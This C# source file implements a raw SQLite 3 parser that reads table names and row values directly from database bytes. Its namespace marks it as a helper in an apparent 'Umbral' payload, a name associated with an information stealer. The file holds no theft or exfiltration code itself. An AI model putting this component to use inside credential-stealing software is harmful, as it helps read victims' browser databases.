﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Umbral.payload.Components.Helpers
{
    public class SQLiteHandler
    {
        private readonly byte[] db_bytes;
        private readonly ulong encoding;
        private string[] field_names = new string[1];
        private sqlite_master_entry[] master_table_entries;
        private readonly ushort page_size;
        private readonly byte[] SQLDataTypeSize = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private table_entry[] table_entries;

        public SQLiteHandler(string baseName)
        {
            if (File.Exists(baseName))
            {
                db_bytes = File.ReadAllBytes(baseName);
                if (Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                {
                    throw new Exception("Not a valid SQLite 3 Database File");
                }

                if (db_bytes[0x34] != 0)
                {
                    throw new Exception("Auto-vacuum capable database is not supported");
                }

                //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
                //{
                //    throw new Exception("No supported Schema layer file-format");
                //}
                page_size = (ushort)ConvertToInteger(0x10, 2);
                encoding = ConvertToInteger(0x38, 4);
                if (decimal.Compare(new decimal(encoding), decimal.Zero) == 0)
                {
                    encoding = 1L;
                }

                ReadMasterTable(100L);
            }
        }

        private ulong ConvertToInteger(int startIndex, int Size)
        {
            if (Size > 8 | Size == 0)
            {
                return 0L;
            }

            ulong num2 = 0L;
            int num4 = Size - 1;
            for (int i = 0; i <= num4; i++)
            {
                num2 = num2 << 8 | db_bytes[startIndex + i];
            }

            return num2;
        }

        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] buffer = new byte[8];
            int num4 = endIndex - startIndex;
            bool flag = false;
            if (num4 == 0 | num4 > 9)
            {
                return 0L;
            }

            if (num4 == 1)
            {
                buffer[0] = (byte)(db_bytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(buffer, 0);
            }

            if (num4 == 9)
            {
                flag = true;
            }

            int num2 = 1;
            int num3 = 7;
            int index = 0;
            if (flag)
            {
                buffer[0] = db_bytes[endIndex - 1];
                endIndex--;
                index = 1;
            }

            int num7 = startIndex;
            for (int i = endIndex - 1; i >= num7; i += -1)
            {
                if (i - 1 >= startIndex)
                {
                    buffer[index] = (byte)((byte)(db_bytes[i] >> (num2 - 1 & 7)) & 0xff >> num2 | (byte)(db_bytes[i - 1] << (num3 & 7)));
                    num2++;
                    index++;
                    num3--;
                }
                else if (!flag)
                {
                    buffer[index] = (byte)((byte)(db_bytes[i] >> (num2 - 1 & 7)) & 0xff >> num2);
                }
            }

            return BitConverter.ToInt64(buffer, 0);
        }

        public int GetRowCount()
        {
            return table_entries.Length;
        }

        public string[] GetTableNames()
        {
            var tableNames = new List<string>();
            int num3 = master_table_entries.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (master_table_entries[i].item_type == "table")
                {
                    tableNames.Add(master_table_entries[i].item_name);
                }
            }

            return tableNames.ToArray();
        }

        public string GetValue(int row_num, int field)
        {
            if (row_num >= table_entries.Length)
            {
                return null;
            }

            if (field >= table_entries[row_num].content.Length)
            {
                return null;
            }

            return table_entries[row_num].content[field];
        }

        public string GetValue(int row_num, string field)
        {
            int num = -1;
            int length = field_names.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }

            if (num == -1)
            {
                return null;
            }

            return GetValue(row_num, num);
        }

        private int GVL(int startIndex)
        {
            if (startIndex > db_bytes.Length)
            {
                return 0;
            }

            int num3 = startIndex + 8;
            for (int i = startIndex; i <= num3; i++)
            {
                if (i > db_bytes.Length - 1)
                {
                    return 0;
                }

                if ((db_bytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }

            return startIndex + 8;
        }

        private bool IsOdd(long value)
        {
            return (value & 1L) == 1L;
        }

        private void ReadMasterTable(ulong Offset)
        {
            if (db_bytes[(int)Offset] == 13)
            {
                ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (master_table_entries != null)
                {
                    length = master_table_entries.Length;
                    Array.Resize(ref master_table_entries, master_table_entries.Length + num2 + 1);
                }
                else
                {
                    master_table_entries = new sqlite_master_entry[num2 + 1];
                }

                int num13 = num2;
                for (int i = 0; i <= num13; i++)
                {
                    ulong num = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }

                    int endIndex = GVL((int)num);
                    long num7 = CVL((int)num, endIndex);
                    int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    master_table_entries[length + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)),
                        num6);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                    endIndex = GVL((int)num);
                    num6 = endIndex;
                    long num5 = CVL((int)num, endIndex);
                    long[] numArray = new long[5];
                    int index = 0;
                    do
                    {
                        endIndex = num6 + 1;
                        num6 = GVL(endIndex);
                        numArray[index] = CVL(endIndex, num6);
                        if (numArray[index] > 9L)
                        {
                            if (IsOdd(numArray[index]))
                            {
                                numArray[index] = (long)Math.Round((numArray[index] - 13L) / 2.0);
                            }
                            else
                            {
                                numArray[index] = (long)Math.Round((numArray[index] - 12L) / 2.0);
                            }
                        }
                        else
                        {
                            numArray[index] = SQLDataTypeSize[(int)numArray[index]];
                        }

                        index++;
                    } while (index <= 4);

                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }

                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.Default.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.Unicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }

                    master_table_entries[length + i].root_num =
                        (long)ConvertToInteger(
                            Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])),
                                new decimal(numArray[2]))), (int)numArray[3]);
                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.Default.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.Unicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                }
            }
            else if (db_bytes[(int)Offset] == 5)
            {
                ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num14 = num11;
                for (int j = 0; j <= num14; j++)
                {
                    ushort startIndex = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) == 0)
                    {
                        ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(startIndex, 4)), decimal.One), new decimal(page_size))));
                    }
                    else
                    {
                        ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + startIndex), 4)), decimal.One), new decimal(page_size))));
                    }
                }

                ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One),
                    new decimal(page_size))));
            }
        }

        public bool ReadTable(string TableName)
        {
            int index = -1;
            int length = master_table_entries.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                {
                    index = i;
                    break;
                }
            }

            if (index == -1)
            {
                return false;
            }

            string[] strArray = master_table_entries[index].sql_statement.Substring(master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(',');
            int num6 = strArray.Length - 1;
            for (int j = 0; j <= num6; j++)
            {
                strArray[j] = strArray[j].TrimStart();
                int num4 = strArray[j].IndexOf(" ");
                if (num4 > 0)
                {
                    strArray[j] = strArray[j].Substring(0, num4);
                }

                if (strArray[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }

                Array.Resize(ref field_names, j + 1);
                field_names[j] = strArray[j];
            }

            return ReadTableFromOffset((ulong)((master_table_entries[index].root_num - 1L) * page_size));
        }

        private bool ReadTableFromOffset(ulong Offset)
        {
            if (db_bytes[(int)Offset] == 13)
            {
                int num2 = Convert.ToInt32(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (table_entries != null)
                {
                    length = table_entries.Length;
                    Array.Resize(ref table_entries, table_entries.Length + num2 + 1);
                }
                else
                {
                    table_entries = new table_entry[num2 + 1];
                }

                int num16 = num2;
                for (int i = 0; i <= num16; i++)
                {
                    var _fieldArray = new record_header_field[1];
                    ulong num = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }

                    int endIndex = GVL((int)num);
                    long num9 = CVL((int)num, endIndex);
                    int num8 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    table_entries[length + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                    endIndex = GVL((int)num);
                    num8 = endIndex;
                    long num7 = CVL((int)num, endIndex);
                    long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                    for (int j = 0; num10 < num7; j++)
                    {
                        Array.Resize(ref _fieldArray, j + 1);
                        endIndex = num8 + 1;
                        num8 = GVL(endIndex);
                        _fieldArray[j].type = CVL(endIndex, num8);
                        if (_fieldArray[j].type > 9L)
                        {
                            if (IsOdd(_fieldArray[j].type))
                            {
                                _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 13L) / 2.0);
                            }
                            else
                            {
                                _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 12L) / 2.0);
                            }
                        }
                        else
                        {
                            _fieldArray[j].size = SQLDataTypeSize[(int)_fieldArray[j].type];
                        }

                        num10 = num10 + (num8 - endIndex) + 1L;
                    }

                    table_entries[length + i].content = new string[_fieldArray.Length - 1 + 1];
                    int num4 = 0;
                    int num17 = _fieldArray.Length - 1;
                    for (int k = 0; k <= num17; k++)
                    {
                        if (_fieldArray[k].type > 9L)
                        {
                            if (!IsOdd(_fieldArray[k].type))
                            {
                                if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                                {
                                    table_entries[length + i].content[k] = Encoding.Default.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                                {
                                    table_entries[length + i].content[k] = Encoding.Unicode.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                                {
                                    table_entries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                            }
                            else
                            {
                                table_entries[length + i].content[k] = Encoding.Default.GetString(db_bytes,
                                    Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                        }
                        else
                        {
                            table_entries[length + i].content[k] = Convert.ToString(ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))),
                                (int)_fieldArray[k].size));
                        }

                        num4 += (int)_fieldArray[k].size;
                    }
                }
            }
            else if (db_bytes[(int)Offset] == 5)
            {
                ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num18 = num14;
                for (int m = 0; m <= num18; m++)
                {
                    ushort num13 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                    ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num13), 4)), decimal.One), new decimal(page_size))));
                }

                ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One),
                    new decimal(page_size))));
            }

            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct record_header_field
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public readonly string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
    }
}